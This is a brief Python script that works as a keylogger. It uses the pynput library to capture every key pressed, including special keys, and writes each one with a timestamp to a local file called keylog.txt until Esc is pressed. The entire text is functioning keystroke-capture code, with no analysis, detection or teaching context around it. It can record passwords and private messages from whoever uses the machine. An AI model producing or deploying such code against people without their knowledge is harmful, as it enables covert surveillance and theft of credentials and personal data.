from pynput import keyboard
import logging

# Configure logging to log keystrokes to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the function to log the keys pressed
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')
# Define the function to stop the listener
def on_release(key):
    if key == keyboard.Key.esc:  # Stop the keylogger when Esc is pressed
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 